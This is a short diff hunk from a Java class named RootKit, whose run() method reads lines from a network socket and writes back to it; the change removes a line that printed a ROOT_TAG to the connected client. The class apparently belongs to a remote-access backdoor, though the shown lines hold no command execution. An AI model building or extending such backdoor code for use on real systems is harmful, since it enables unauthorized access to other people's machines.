@@ -30,7 +30,6 @@ public class RootKit extends Thread {
     public void run() {
         try(Scanner scanner = new Scanner(socket.getInputStream());) {
             PrintWriter printWriter = new PrintWriter(socket.getOutputStream(), true);
-            printWriter.print(ROOT_TAG);
             while (scanner.hasNextLine()) {
                 try {
                     String str = scanner.nextLine();
